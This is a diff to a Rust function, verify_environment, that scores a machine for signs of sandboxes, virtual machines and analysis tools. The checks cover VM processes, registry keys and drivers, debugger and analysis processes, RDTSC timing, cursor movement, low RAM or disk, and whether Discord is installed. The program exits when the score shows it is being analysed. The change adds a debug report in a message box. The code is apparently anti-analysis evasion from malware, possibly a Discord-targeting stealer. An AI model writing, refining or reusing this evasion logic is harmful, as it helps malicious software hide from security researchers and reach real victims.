@@ -302,32 +302,38 @@ fn check_host_user_names() -> bool {
 
 pub fn verify_environment() {
     let mut score: i32 = 0;
+    let mut report = String::new();
 
-    // Hard requirements (very reliable, low false-positive risk)
-    if !is_any_discord_installed() { score += 40; }
-    if !check_uptime()             { score += 30; }
-    if !check_ram()                { score += 25; }
-    if !check_cpu_count()          { score += 20; }
-    if !check_resolution()         { score += 15; }
-
-    // Medium-reliability checks
-    if !check_no_vm_processes()    { score += 35; }
-    if !check_no_analysis_processes() { score += 30; }
-    if !check_no_vm_registry()     { score += 30; }
-    if !check_no_extra_vm_drivers(){ score += 25; }
-    if !check_display_adapter()    { score += 25; }
-    if !check_disk_size()          { score += 20; }
-    if !check_host_user_names()    { score += 20; }
-    if !check_foreground_window()  { score += 10; }
-
-    // Soft heuristics (can have false positives, so weighted low)
-    if !check_rdtsc_timing()       { score += 15; }
-    if let Some(moved) = check_cursor_movement() {
-        if !moved                  { score += 10; }
+    macro_rules! chk {
+        ($name:expr, $val:expr, $pts:expr) => {{
+            let ok = $val;
+            if !ok { score += $pts; }
+            report.push_str(&format!("{}: {} (+{})\n", $name, if ok {"OK"} else {"FAIL"}, if ok {0} else {$pts}));
+        }};
     }
 
-    // Any score >= 40 is enough to exit.
-    // A real machine will score 0. A sandbox typically scores 40-200+.
+    chk!("discord",      is_any_discord_installed(),    40);
+    chk!("uptime",       check_uptime(),                30);
+    chk!("ram",          check_ram(),                   25);
+    chk!("cpu",          check_cpu_count(),             20);
+    chk!("resolution",   check_resolution(),            15);
+    chk!("vm_procs",     check_no_vm_processes(),       35);
+    chk!("analysis",     check_no_analysis_processes(), 30);
+    chk!("vm_registry",  check_no_vm_registry(),        30);
+    chk!("vm_drivers",   check_no_extra_vm_drivers(),   25);
+    chk!("display",      check_display_adapter(),       25);
+    chk!("disk",         check_disk_size(),             20);
+    chk!("names",        check_host_user_names(),       20);
+    chk!("foreground",   check_foreground_window(),     10);
+    chk!("rdtsc",        check_rdtsc_timing(),          15);
+    if let Some(moved) = check_cursor_movement() {
+        if !moved { score += 10; }
+        report.push_str(&format!("cursor_moved: {} (+{})\n", moved, if moved {0} else {10}));
+    }
+
+    report.push_str(&format!("\nTOTAL SCORE: {}/40", score));
+    api::message_box("SandboxCheck", &report, api::MB_OK);
+
     if score >= 40 {
         fail_and_exit();
     }
